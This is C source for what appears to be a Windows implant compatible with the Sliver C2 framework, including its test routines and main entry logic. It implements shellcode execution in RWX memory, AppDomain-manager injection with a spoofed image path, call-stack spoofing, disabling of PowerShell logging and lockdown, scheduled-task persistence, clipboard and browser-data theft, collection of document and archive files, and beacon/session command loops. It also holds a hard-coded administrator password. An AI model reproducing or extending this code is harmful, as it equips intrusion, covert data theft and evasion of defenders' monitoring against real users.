	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	SecureZeroMemory(&ProcInfo, sizeof(ProcInfo));
	StartupInfo.cb = sizeof(StartupInfo);
	if (!CreateProcessWithLogonW(L"Administrator", NULL, L"Caydabode1", 0, L"C:\\Windows\\System32\\notepad.exe", L"C:\\Windows\\System32\\notepad.exe C:\\Users\\Admin\\Desktop\\a.txt", 0, NULL, NULL, &StartupInfo, &ProcInfo)) {
		LOG_ERROR("CreateProcessWithLogonW", GetLastError());
		return;
	}

	PrintFormatW(L"Success!\n");
}

void test170(void) {
	GetProcAddressH(HASHA("KERNELBASE.DLL"), HASHA("AccessCheck"));
	GetProcAddressH(HASHA("KERNELBASE.DLL"), HASHA("AccessCheck"));
}

void test171(void) {
	PRTL_USER_PROCESS_EXTENDED_PARAMETERS pProcessParameters = NULL;
	RTL_USER_PROCESS_INFORMATION ProcInfo;
	NTSTATUS Status = ERROR_SUCCESS;
	UNICODE_STRING SpoofedImagePathName;
	UNICODE_STRING CurrentDirectory;
	UNICODE_STRING CommandLine;
	UNICODE_STRING ImagePathName;
	LPWSTR EnvironmentBlock = NULL;
	LPWSTR lpTemp = NULL;
	LPWSTR NewEnvironmentBlock = NULL;
	DWORD cchEnvironmentBlock = 0;
	WCHAR wszAppDomainManagerEnv[] = L"APPDOMAIN_MANAGER_ASM=DirtyCLR, Version=1.0.0.0, Culture=neutral, PublicKeyToken=47c6faf8f321e3a7\0APPDOMAIN_MANAGER_TYPE=DirtyCLRDomain\0COMPLUS_Version=v4.0.30319\0\0";

	SecureZeroMemory(&ProcInfo, sizeof(ProcInfo));
	InitUnicodeString(&SpoofedImagePathName, L"\\??\\D:\\Temp\\DirtyCLR\\DirtyCLR\\bin\\Debug\\UevAppMonitor.exe");
	InitUnicodeString(&CurrentDirectory, L"C:\\Windows\\System32\\");
	InitUnicodeString(&CommandLine, L"\"C:\\Windows\\System32\\UevAppMonitor.exe\"");
	InitUnicodeString(&ImagePathName, L"\\??\\C:\\Windows\\System32\\UevAppMonitor.exe");
	EnvironmentBlock = GetEnvironmentStringsW();
	lpTemp = EnvironmentBlock;
	while (lpTemp[0] != L'\0') {
		cchEnvironmentBlock += lstrlenW(lpTemp) + 1;
		lpTemp = &EnvironmentBlock[cchEnvironmentBlock];
	}

	NewEnvironmentBlock = ALLOC((cchEnvironmentBlock + _countof(wszAppDomainManagerEnv)) * sizeof(WCHAR));
	memcpy(NewEnvironmentBlock, EnvironmentBlock, cchEnvironmentBlock * sizeof(WCHAR));
	memcpy(&NewEnvironmentBlock[cchEnvironmentBlock], wszAppDomainManagerEnv, sizeof(wszAppDomainManagerEnv));
	Status = RtlCreateProcessParametersEx(&pProcessParameters, &SpoofedImagePathName, NULL, &CurrentDirectory, &CommandLine, NewEnvironmentBlock, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("RtlCreateProcessParametersEx", Status);
		goto CLEANUP;
	}

	Status = RtlCreateUserProcess(&ImagePathName, 0, pProcessParameters, NULL, NULL, GetCurrentProcess(), TRUE, NULL, NULL, &ProcInfo);
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("RtlCreateUserProcess", Status);
		goto CLEANUP;
	}

	Status = NtResumeThread(ProcInfo.ThreadHandle, NULL);
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("NtResumeThread", Status);
		goto CLEANUP;
	}

	NtClose(ProcInfo.ProcessHandle);
	NtClose(ProcInfo.ThreadHandle);
CLEANUP:
	if (pProcessParameters != NULL) {
		RtlDestroyProcessParameters(pProcessParameters);
	}

	if (EnvironmentBlock != NULL) {
		FreeEnvironmentStringsW(EnvironmentBlock);
	}

	FREE(NewEnvironmentBlock);
}

void test172(void) {
	PrintFormatA("0x%08x\n", _HashStringRotr32A("IUMSDK.DLL"));
}

void test173(void) {
	DWORD dwFrameSize = 0;

	FindGadget(0, &dwFrameSize);
	FindGadget(1, &dwFrameSize);
}

void test174(void) {
	PRUNTIME_FUNCTION pRuntimeFunctionList = NULL;
	DWORD dwNumberOfFunctions = 0;
	HMODULE hModule = NULL;
	DWORD i = 0;
	DWORD dwFrameSize = 0;
	PUNWIND_INFO pUnwindInfo = NULL;

	hModule = GetModuleHandleA(NULL);
	pRuntimeFunctionList = GetExceptionDirectoryAddress(hModule, &dwNumberOfFunctions);

	for (i = 0; i < dwNumberOfFunctions; i++) {
		pUnwindInfo = (PUNWIND_INFO)((UINT64)hModule + pRuntimeFunctionList[i].UnwindInfoAddress);
		dwFrameSize = GetStackFrameSize(hModule, pUnwindInfo);
		PrintFormatA("Address 0x%08x: 0x%08x\n", pRuntimeFunctionList[i].BeginAddress, dwFrameSize);
	}
}

void test175(void) {
	DWORD dwFrameOffset = 0;
	DWORD dwFrameSize = 0;

	FindSetFpProlog(&dwFrameOffset, &dwFrameSize, NULL);
}

void test176(void) {
	DWORD dwFrameOffset = 0;
	DWORD dwFrameSize = 0;

	FindSaveRbp(&dwFrameOffset, &dwFrameSize, NULL);
}

void test177(void) {
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;

	if (!SetupStackSpoofing()) {
		return;
	}

	SecureZeroMemory(&pi, sizeof(pi));
	SecureZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	SpoofCall(CreateProcessW, L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

void test178(void) {
	HANDLE hClipboard = NULL;
	LPWSTR lpMessage = NULL;
	HWND hWindow = NULL;
	MSG Message;

	hWindow = CreateWindowExW(0, L"Edit", L"Sample Window", WS_MINIMIZE | WS_OVERLAPPED, 100, 100, 100, 100, NULL, NULL, NULL, NULL);
	if (hWindow == NULL) {
		LOG_ERROR("CreateWindowExW", GetLastError());
		goto CLEANUP;
	}

	if (!AddClipboardFormatListener(hWindow)) {
		LOG_ERROR("AddClipboardFormatListener", GetLastError());
		goto CLEANUP;
	}

	while (TRUE) {
		SecureZeroMemory(&Message, sizeof(Message));
		if (GetMessageW(&Message, hWindow, WM_CLIPBOARDUPDATE, WM_CLIPBOARDUPDATE)) {
			if (Message.message == WM_CLIPBOARDUPDATE) {
				if (OpenClipboard(NULL)) {
					hClipboard = GetClipboardData(CF_UNICODETEXT);
					if (hClipboard != NULL) {
						lpMessage = (LPWSTR)GlobalLock(hClipboard);
					}

					CloseClipboard();
				}
			}
		}

		Sleep(5000);
	}
	
CLEANUP:
	if (hWindow != NULL) {
		DestroyWindow(hWindow);
	}

	return;
}

void test179(void) {
	GLOBAL_CONFIG Config;

	SecureZeroMemory(&Config, sizeof(Config));
	lstrcpyW(Config.wszWarehouse, L"C:\\Users\\Admin\\Desktop\\Warehouse");
	StealClipboard(&Config);
	Sleep(100000000);
}

void test180(void) {
	CHAR Buffer[0x200] = "Hello Worlddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd";
	LPSTR lpDest = &Buffer[5];

	MemCopy(lpDest, Buffer, lstrlenA(Buffer), 0);
}

void test181(void) {
	PBYTE pShellcode = NULL;
	DWORD cbShellcode = 0;
	PBYTE pBuffer = NULL;

	pShellcode = ReadFromFile(L"C:\\Users\\Admin\\AppData\\Roaming\\CLView\\db.dat", &cbShellcode);
	pBuffer = (PBYTE)VirtualAlloc(NULL, cbShellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(pBuffer, pShellcode, cbShellcode);
	pBuffer += 0xA6A0;
	((VOID(*)(VOID))pBuffer)();
	Sleep(0xFFFFFFFF);
	return;
}

void test182(void) {
	PBYTE pCipherText = NULL;
	DWORD cbCipherText = 0;

	pCipherText = ReadFromFile(L"C:\\Users\\Admin\\AppData\\Roaming\\Logitech\\logitech.cfg", &cbCipherText);
	Rc4EncryptDecrypt(pCipherText, cbCipherText, "config_key", lstrlenA("config_key"));
}

void test183(void) {
	GetProcAddress(LoadLibraryW(L"api-ms-win-core-com-l1-1-0.dll"), "CoInitializeEx");
	GetProcAddressH(HASHA("OLE32.DLL"), HASHA("CoInitializeEx"));
}

void test184(void) {
	HANDLE hFile = INVALID_HANDLE_VALUE;
	UINT64 uTemp = 0;
	FILETIME CreationTime;

	hFile = CreateFileW(L"C:\\Users\\Admin\\Downloads\\download.dat", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) {
		if (GetFileTime(hFile, &CreationTime, NULL, NULL)) {
			uTemp = (((UINT64)CreationTime.dwHighDateTime) << 32) + CreationTime.dwLowDateTime;
		}

		CloseHandle(hFile);
	}
}

void test185() {
	FILETIME Now;
	UINT64 uTime1 = 0;
	UINT64 uTime2 = 0;

	GetSystemTimeAsFileTime(&Now);
	uTime1 = (((UINT64)Now.dwHighDateTime) << 32) + Now.dwLowDateTime;
	Sleep(10000);
	GetSystemTimeAsFileTime(&Now);
	uTime2 = (((UINT64)Now.dwHighDateTime) << 32) + Now.dwLowDateTime;
	PrintFormatA("%d\n", uTime2 - uTime1);
}

void test186(void) {
	GLOBAL_CONFIG Config;

	SecureZeroMemory(&Config, sizeof(Config));
	lstrcpyW(Config.wszWarehouse, L"C:\\ProgramData\\1Kf9IGFM");
	LootBrowserData(&Config);
}

void test187(void) {
	BYTE Buffer[] = { 16, 1, 26, 219, 2, 10, 14, 68, 69, 67, 73, 83, 73, 86, 69, 95, 70, 69, 82, 82, 89, 18, 15, 68, 69, 83, 75, 84, 79, 80, 45, 55, 83, 75, 73, 73, 71, 69, 26, 36, 52, 99, 52, 99, 52, 53, 52, 52, 45, 48, 48, 52, 98, 45, 52, 97, 49, 48, 45, 56, 48, 53, 56, 45, 98, 52, 99, 48, 52, 102, 51, 49, 52, 54, 51, 51, 34, 21, 68, 69, 83, 75, 84, 79, 80, 45, 55, 83, 75, 73, 73, 71, 69, 92, 65, 100, 109, 105, 110, 42, 45, 83, 45, 49, 45, 53, 45, 50, 49, 45, 50, 56, 56, 57, 56, 50, 55, 52, 54, 50, 45, 49, 53, 56, 51, 52, 52, 48, 57, 48, 56, 45, 55, 53, 49, 55, 57, 52, 55, 54, 49, 45, 49, 48, 48, 49, 50, 44, 83, 45, 49, 45, 53, 45, 50, 49, 45, 50, 56, 56, 57, 56, 50, 55, 52, 54, 50, 45, 49, 53, 56, 51, 52, 52, 48, 57, 48, 56, 45, 55, 53, 49, 55, 57, 52, 55, 54, 49, 45, 53, 49, 51, 58, 7, 119, 105, 110, 100, 111, 119, 115, 66, 5, 97, 109, 100, 54, 52, 72, 208, 169, 2, 82, 53, 68, 58, 92, 68, 111, 99, 117, 109, 101, 110, 116, 115, 92, 115, 111, 117, 114, 99, 101, 92, 114, 101, 112, 111, 115, 92, 77, 97, 108, 68, 101, 118, 92, 120, 54, 52, 92, 82, 101, 108, 101, 97, 115, 101, 92, 84, 101, 115, 116, 46, 101, 120, 101, 98, 21, 49, 48, 32, 98, 117, 105, 108, 100, 32, 49, 57, 48, 52, 53, 32, 120, 56, 54, 95, 54, 52, 104, 216, 4, 130, 1, 36, 57, 101, 99, 100, 52, 55, 55, 50, 45, 50, 50, 101, 100, 45, 52, 50, 56, 100, 45, 98, 101, 48, 55, 45, 97, 50, 53, 55, 57, 48, 57, 50, 102, 55, 52, 48, 136, 1, 163, 182, 158, 235, 246, 208, 177, 132, 186, 1, 146, 1, 5, 101, 110, 45, 85, 83 };
	BYTE Key[] = { 73, 16, 174, 197, 227, 68, 53, 53, 127, 80, 212, 76, 89, 155, 27, 5, 43, 76, 208, 44, 25, 2, 41, 79, 133, 4, 7, 139, 17, 166, 63, 56 };
	BUFFER TempBuffer;
	PBUFFER pResult = NULL;

	TempBuffer.pBuffer = Buffer;
	TempBuffer.cbBuffer = sizeof(Buffer);
	pResult = SliverEncrypt(Key, &TempBuffer);
	PrintFormatA("pResult:\n");
	HexDump(pResult->pBuffer, pResult->cbBuffer);
}

void test188(void) {
	LPSTR* lpRuntime = NULL;

	lpRuntime = GetRuntimeVersion(NULL);
	PrintFormatA("Version: %s\n%s", lpRuntime[0], lpRuntime[1]);
}

void test189(void) {
	CreateTimeTriggerTask(L"Logitech", L"\\", L"C:\\Windows\\System32\\calc.exe", (BSTR)L"PT1M");
}

void test190(void) {
	IsScheduledTaskExist(L"ZoomUpdateTaskUser-S-1-5-21-2889827462-1583440908-751794761-1001", L"\\Microsoft\\Office");
}

void test191(void) {
	ShellExecuteW(NULL, L"open", L"cmd.exe", L"/q /c timeout 5 && touch C:\\Users\\Admin\\Desktop\\a.txt", NULL, SW_HIDE);
}

void test192(void) {
	LogError(L"Hello Error Log");
}

void test193(void) {
	LPWSTR OldPath[5];
	WCHAR wszExplorerPath[MAX_PATH];

	SecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
	SecureZeroMemory(OldPath, sizeof(OldPath));
	GetWindowsDirectoryW(wszExplorerPath, _countof(wszExplorerPath));
	lstrcatW(wszExplorerPath, L"\\explorer.exe");
	MasqueradeProcessPath(wszExplorerPath, FALSE, OldPath);
	MessageBoxW(NULL, wszExplorerPath, L"Title", MB_OK);
	MasqueradedCreateDirectoryFileCOM(L"C:\\Windows\\Setup\\Scripts");
	MasqueradeProcessPath(NULL, TRUE, OldPath);
}

void test194(void) {
	WCHAR wszCurrentDir[MAX_PATH];

	GetCurrentDirectoryW(_countof(wszCurrentDir), wszCurrentDir);
	PrintFormatW(L"%s\n", wszCurrentDir);
}

void test195(void) {
	GLOBAL_CONFIG Config;

	SecureZeroMemory(&Config, sizeof(Config));
	Config.lpMainExecutable = L"C:\\Windows\\System32\\calc.exe";
	Persistence3(&Config);
}

void test196(void) {
	/*PCLR_CONTEXT pClrCtx = NULL;
	VARIANT vtInitialRunspaceConfiguration;
	LPWSTR ppwszArguments[] = { L"-EncodedCommand", L"JABmAGkAbABlAHMAIAA9ACAARwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAQwA6AFwAVwBpAG4AZABvAHcAcwAnACAALQBGAGkAbABlAAoAZgBvAHIAZQBhAGMAaAAgACgAJABmAGkAbABlACAAaQBuACAAJABmAGkAbABlAHMAKQAgAHsACgBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIARgBpAGwAZQAgAG4AYQBtAGUAOgAgACQAKAAkAGYAaQBsAGUALgBOAGEAbQBlACkALAAgAGYAaQBsAGUAIABzAGkAegBlADoAIAAkACgAJABmAGkAbABlAC4ATABlAG4AZwB0AGgAKQAgAGIAeQB0AGUAcwAiAAoAfQA=", L"> C:\\Users\\Admin\\Desktop\\output.txt"};

	SecureZeroMemory(&vtInitialRunspaceConfiguration, sizeof(vtInitialRunspaceConfiguration));
	pClrCtx = InitializeCommonLanguageRuntime(L"TestDomain", NULL);
	CreateInitialRunspaceConfiguration(pClrCtx->pAppDomain, &vtInitialRunspaceConfiguration);
	if (!DisablePowerShellEtwProvider(pClrCtx->pAppDomain)) {
		goto CLEANUP;
	}

	if (!PatchTranscriptionOptionFlushContentToDisk(pClrCtx->pAppDomain)) {
		goto CLEANUP;
	}

	if (!PatchAuthorizationManagerShouldRunInternal(pClrCtx->pAppDomain)) {
		goto CLEANUP;
	}

	if (!PatchSystemPolicyGetSystemLockdownPolicy(pClrCtx->pAppDomain)) {
		goto CLEANUP;
	}

	StartConsoleShell(pClrCtx->pAppDomain, &vtInitialRunspaceConfiguration, L"Windows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.", L"Help message", ppwszArguments, ARRAYSIZE(ppwszArguments));
CLEANUP:
	return;*/
}

void test197(void) {
	ENVELOPE Envelope;
	PPBElement ReqElements[1];
	PPBElement pFinalElement = NULL;
	CHAR wszCommand[] = "cd C:\\Windows\\System32\\winevt\\Logs ; $a = ls -File | where {$_.Name -like \"*shell*\"} ; $a | Get-Member";
	HANDLE hThread = NULL;
	DWORD dwThreadID = 0;
	PENVELOPE ThreadParams[2];

	SecureZeroMemory(&Envelope, sizeof(Envelope));
	ReqElements[0] = CreateBytesElement(wszCommand, lstrlenA(wszCommand), 1);
	pFinalElement = CreateStructElement(&ReqElements, _countof(ReqElements), 0);
	Envelope.pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	ThreadParams[0] = &Envelope;

	/*hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PowerShellHandler, (LPVOID)ThreadParams, 0, &dwThreadID);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);*/
	PowerShellHandler(ThreadParams);
	PrintFormatA("-------------------------------------------------------------\n");
	PowerShellHandler(ThreadParams);
	/*hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PowerShellHandler, (LPVOID)ThreadParams, 0, &dwThreadID);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);*/
	Sleep(100000);
}

#endif

BOOL IsInstanceExist
(
	PGLOBAL_CONFIG pConfig
)
{
	BOOL Result = FALSE;

	pConfig->hMutex = CreateMutexW(NULL, TRUE, pConfig->lpUniqueName);
	if (pConfig->hMutex == NULL && GetLastError() == ERROR_ALREADY_EXISTS) {
		Result = TRUE;
	}

	return Result;
}

//BOOL Persistence
//(
//	_In_ PGLOBAL_CONFIG pConfig
//)
//{
//	CHAR szModulePath[0x200];
//	CHAR szOOBEPath[MAX_PATH];
//	LPSTR lpTemp = NULL;
//	LPSTR lpTemp2 = NULL;
//	LPSTR lpCommand = NULL;
//	BOOL Result = FALSE;
//	PBYTE pHashValue = NULL;
//	LPWSTR lpMutexName = NULL;
//	LPWSTR lpLockPath = NULL;
//
//	SecureZeroMemory(szModulePath, sizeof(szModulePath));
//
//	pHashValue = ComputeSHA256(pConfig->lpPeerPrivKey, lstrlenA(pConfig->lpPeerPrivKey));
//	lpMutexName = ConvertBytesToHexW(pHashValue, 8);
//	lpLockPath = DuplicateStrW(pConfig->lpSliverPath, lstrlenW(lpMutexName) + 6);
//	lstrcatW(lpLockPath, L"\\");
//	lstrcatW(lpLockPath, lpMutexName);
//	lstrcatW(lpLockPath, L".txt");
//	if (IsFileExist(lpLockPath)) {
//		Result = TRUE;
//		goto CLEANUP;
//	}
//
//	GetModuleFileNameA(NULL, szModulePath, _countof(szModulePath));
//	if (!WriteToFile(lpLockPath, szModulePath, lstrlenA(szModulePath))) {
//		goto CLEANUP;
//	}
//
//	lpCommand = DuplicateStrA("@echo off\n@cd ", 0);
//	lpTemp = ConvertWcharToChar(pConfig->lpSliverPath);
//	lpCommand = StrCatExA(lpCommand, lpTemp);
//	lpCommand = StrCatExA(lpCommand, "\n@schtasks /query /tn Logitech\n@if \"%ERRORLEVEL%\"==\"1\" schtasks /create /sc MINUTE /tn Logitech /tr %WINDIR%\\System32\\oobe\\oobeldr.exe /mo 5\n@for %%a in (*.txt) do (type %%a & if not \"% ERRORLEVEL%\"==\"2\" for /f \"tokens=*\" %%* in (%%a) do (%%*))\n@for %%a in (*.in) do (for /f \"delims=. tokens=1\" %%b in (\"%%a\") do (for /f \"tokens=*\" %%d in (%%a) do (%%d 1>%%b.out 2>%%b.err)) & del %%a)");
//	if (!PersistenceMethod1(lpCommand)) {
//		goto CLEANUP;
//	}
//
//	GetSystemDirectoryA(szOOBEPath, _countof(szOOBEPath));
//	lpTemp2 = StrStrA(szOOBEPath, "system32");
//	lpTemp2[0] = 'S';
//	lstrcatA(szOOBEPath, "\\oobe\\oobeldr.exe");
//	if (!PersistenceMethod2(szOOBEPath, pConfig)) {
//		goto CLEANUP;
//	}
//
//	Result = TRUE;
//CLEANUP:
//	CreateFileW(lpLockPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
//
//	FREE(lpCommand);
//	FREE(lpTemp);
//	FREE(pHashValue);
//	FREE(lpMutexName);
//	FREE(lpLockPath);
//
//	return Result;
//}

VOID Final(VOID)
{
	DWORD dwThreadId = 0;
	PGLOBAL_CONFIG pGlobalConfig = NULL;
	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
	LPWSTR lpTemp = NULL;
	LPWSTR DocumentExtensions[] = { L".doc", L".docm", L".docx", L".pdf", L".ppsm", L".ppsx", L".ppt", L".pptm", L".pptx", L".pst", L".rtf", L".xlm", L".xls", L".xlsm", L".xlsx", L".odt", L".ods", L".odp", L".odg", L".odf" };
	LPWSTR ArchiveExtensions[] = { L".rar", L".zip", L".tar", L".gz", L".xz", L".sz", L".7z" };
	DWORD i = 0;
	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
	LPSTR lpUniqueID = NULL;
	PBYTE pDigest = NULL;
	WCHAR wszLastLootTime[MAX_PATH];
	PBYTE pTemp = NULL;

#ifndef _DEBUG
	if (CheckForBlackListProcess()) {
		goto CLEANUP;
	}
#endif

	pGlobalConfig = UnmarshalConfig();
	if (pGlobalConfig == NULL) {
		goto CLEANUP;
	}

	pGlobalConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
	RtlInitializeSRWLock(&pGlobalConfig->RWLock);
	pGlobalConfig->uPeerID = GeneratePeerID();
	pGlobalConfig->dwListenerID = 1;
	pGlobalConfig->hCurrentToken = GetCurrentProcessToken();
	pGlobalConfig->DocumentExtensions = ALLOC(sizeof(LPWSTR) * _countof(DocumentExtensions));
	pGlobalConfig->cDocumentExtensions = _countof(DocumentExtensions);
	for (i = 0; i < _countof(DocumentExtensions); i++) {
		pGlobalConfig->DocumentExtensions[i] = DuplicateStrW(DocumentExtensions[i], 0);
	}

	pGlobalConfig->ArchiveExtensions = ALLOC(sizeof(LPWSTR) * _countof(ArchiveExtensions));
	pGlobalConfig->cArchiveExtensions = _countof(ArchiveExtensions);
	for (i = 0; i < _countof(ArchiveExtensions); i++) {
		pGlobalConfig->ArchiveExtensions[i] = DuplicateStrW(ArchiveExtensions[i], 0);
	}

	/*ExpandEnvironmentStringsW(L"%USERPROFILE%", wszUserProfile, _countof(wszUserProfile));
	pGlobalConfig->dwNumberOfMonitoredFolder = 3;
	pGlobalConfig->MonitoredFolder = ALLOC(sizeof(LPWSTR) * pGlobalConfig->dwNumberOfMonitoredFolder);
	for (i = 0; i < pGlobalConfig->dwNumberOfMonitoredFolder - 1; i++) {
		pGlobalConfig->MonitoredFolder[i] = DuplicateStrW(wszUserProfile, 0x20);
	}

	lstrcatW(pGlobalConfig->MonitoredFolder[0], L"\\Documents");
	lstrcatW(pGlobalConfig->MonitoredFolder[1], L"\\Downloads");
	pGlobalConfig->MonitoredFolder[2] = ALLOC(sizeof(WCHAR) * MAX_PATH);
	if (!SHGetSpecialFolderPathW(NULL, pGlobalConfig->MonitoredFolder[2], CSIDL_DESKTOP, FALSE)) {
		FREE(pGlobalConfig->MonitoredFolder[2]);
		pGlobalConfig->dwNumberOfMonitoredFolder--;
		pGlobalConfig->MonitoredFolder[2] = NULL;
	}*/

	lpUniqueID = GetComputerUserName();
	lpUniqueID = StrCatExA(lpUniqueID, pGlobalConfig->lpPeerPrivKey);
	lpUniqueID = StrCatExA(lpUniqueID, pGlobalConfig->lpSliverName);
	pDigest = ComputeSHA256(lpUniqueID, lstrlenA(lpUniqueID));
	pGlobalConfig->lpUniqueName = ConvertBytesToHexW(pDigest, SHA256_HASH_SIZE);
	pGlobalConfig->lpUniqueName[16] = L'\0';
	
	if (pGlobalConfig->Loot) {
		GetTempPathW(_countof(wszLastLootTime), wszLastLootTime);
		lstrcatW(wszLastLootTime, pGlobalConfig->lpUniqueName);
		lstrcatW(wszLastLootTime, L".tmp");
		pTemp = ReadFromFile(wszLastLootTime, NULL);
		if (pTemp != NULL) {
			memcpy((LPVOID)(&pGlobalConfig->LastLootTime), pTemp, sizeof(pGlobalConfig->LastLootTime));
		}
	}

	ExpandEnvironmentStringsW(L"%ALLUSERSPROFILE%", pGlobalConfig->wszWarehouse, _countof(pGlobalConfig->wszWarehouse));
	lstrcatW(pGlobalConfig->wszWarehouse, L"\\");
	lstrcatW(pGlobalConfig->wszWarehouse, pGlobalConfig->lpUniqueName);
	if (IsInstanceExist(pGlobalConfig)) {
		goto CLEANUP;
	}

#ifndef _DEBUG
#ifdef _FULL
	if (!Persistence(pGlobalConfig)) {
		goto CLEANUP;
	}
#else
	if (!Persistence3(pGlobalConfig)) {
		goto CLEANUP;
	}
#endif
#endif

	if (!Persistence3(pGlobalConfig)) {
		goto CLEANUP;
	}

	if (pGlobalConfig->Loot) {
		LootBrowserData(pGlobalConfig);
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorUsb, pGlobalConfig, 0, &dwThreadId);
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LootFile, pGlobalConfig, 0, &dwThreadId);
	}

	if (pGlobalConfig->Clipboard) {
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StealClipboard, pGlobalConfig, 0, &dwThreadId);
	}
	
	if (pGlobalConfig->Type == Beacon || pGlobalConfig->Type == Pivot) {
		pBeaconClient = BeaconInit(pGlobalConfig);
		BeaconMainLoop(pBeaconClient);
	}
	else if (pGlobalConfig->Type == Session) {
		pSessionClient = SessionInit(pGlobalConfig);
		if (pSessionClient == NULL) {
			goto CLEANUP;
		}

		SessionMainLoop(pSessionClient);
	}
	else {
		goto CLEANUP;
	}

CLEANUP:
	FREE(pTemp);
	FREE(lpUniqueID);
	FreeBeaconClient(pBeaconClient);
	FreeSessionClient(pSessionClient);
	FreeGlobalConfig(pGlobalConfig);

	return;
}

LONG VectoredExceptionHandler
(
	_In_ PEXCEPTION_POINTERS ExceptionInfo
)
{
	DWORD dwExceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;

	if (dwExceptionCode == 0xe0434352 || dwExceptionCode == 0x4242420) {
		return EXCEPTION_CONTINUE_SEARCH;
	}

#ifdef _DEBUG
	PrintFormatW(L"Exception code: 0x%08x\n", dwExceptionCode);
	if (dwExceptionCode == EXCEPTION_BREAKPOINT) {
		//PrintStackTrace(ExceptionInfo->ContextRecord);
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	else {
		PrintStackTrace(ExceptionInfo->ContextRecord);
		ExitProcess(-1);
	}
#endif
}

LRESULT WindowProc
(
	_In_ HWND hWnd,
	_In_ UINT uMsg,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	if (uMsg == WM_QUERYENDSESSION || uMsg == WM_ENDSESSION || uMsg == WM_DESTROY || uMsg == WM_CLOSE) {
		ShutdownBlockReasonCreate(hWnd, L"Please, don't kill me");
	}
	else if (uMsg == WM_DEVICECHANGE) {
		if (wParam == DBT_DEVICEARRIVAL) {
			MessageBoxA(NULL, "DBT_DEVICEARRIVAL", "Title", MB_OK);
		}
	}
	else {
		return DefWindowProcW(hWnd, uMsg, wParam, lParam);
	}

	return 0;
}

DWORD MessageLoop
(
	_In_ HWND hInstance
)
{
	WNDCLASSEX WndClass;
	HWND hWndMain = NULL;
	MSG Msg;
	DWORD dwRetcode = 0;
	WCHAR wszClassName[] = L"ShutdownWin";

	SecureZeroMemory(&WndClass, sizeof(WndClass));
	WndClass.cbSize = sizeof(WNDCLASSEX);
	WndClass.style = 0;
	WndClass.lpfnWndProc = WindowProc;
	WndClass.cbClsExtra = 0;
	WndClass.cbWndExtra = 0;
	WndClass.hInstance = hInstance;
	WndClass.hIcon = LoadIconW(NULL, IDI_APPLICATION);
	WndClass.hCursor = LoadCursorW(NULL, IDC_ARROW);
	WndClass.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	WndClass.lpszMenuName = NULL;
	WndClass.lpszClassName = wszClassName;
	WndClass.hIconSm = LoadIconW(NULL, IDI_APPLICATION);
	if (!RegisterClassExW(&WndClass)) {
		LOG_ERROR("RegisterClassExW", GetLastError());
		goto CLEANUP;
	}

	hWndMain = CreateWindowExW(WS_EX_CLIENTEDGE, wszClassName, NULL, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL);
	if (hWndMain == NULL) {
		LOG_ERROR("CreateWindowExW", GetLastError());
		goto CLEANUP;
	}

	ShowWindow(hWndMain, SW_HIDE);
	UpdateWindow(hWndMain);
	while (GetMessageW(&Msg, NULL, 0, 0) > 0) {
		TranslateMessage(&Msg);
		DispatchMessageW(&Msg);
	}

	dwRetcode = Msg.wParam;
CLEANUP:

	return dwRetcode;
}

//int WinMain
//(
//	_In_ HINSTANCE hInstance,
//	_In_opt_ HINSTANCE hPrevInstance,
//	_In_ LPSTR lpCmdLine,
//	_In_ int nShowCmd
//)
int main()
{
	DWORD dwLevel = 0;
	DWORD dwFlags = 0;
	HANDLE hThread = NULL;

//#ifdef _DEBUG
//	if (!AttachConsole(GetParentProcessId(GetCurrentProcessId()))) {
//		AllocConsole();
//	}
//#endif
//	if (GetProcessShutdownParameters(&dwLevel, &dwFlags)) {
//		if (!SetProcessShutdownParameters(dwLevel, SHUTDOWN_NORETRY)) {
//			LOG_ERROR("SetProcessShutdownParameters", GetLastError());
//			goto CLEANUP;
//		}
//	}
//	else {
//		LOG_ERROR("GetProcessShutdownParameters", GetLastError());
//		goto CLEANUP;
//	}
	LoadLibraryW(L"advapi32.dll");
	LoadLibraryW(L"bcrypt.dll");
	LoadLibraryW(L"combase.dll");
	LoadLibraryW(L"crypt32.dll");
	LoadLibraryW(L"dbghelp.dll");
	LoadLibraryW(L"gdi32full.dll");
	LoadLibraryW(L"IPHLPAPI.dll");
	LoadLibraryW(L"ole32.dll");
	LoadLibraryW(L"oleaut32.dll");
	LoadLibraryW(L"rpcrt4.dll");
	LoadLibraryW(L"sechost.dll");
	LoadLibraryW(L"shlwapi.dll");
	LoadLibraryW(L"verifier.dll");
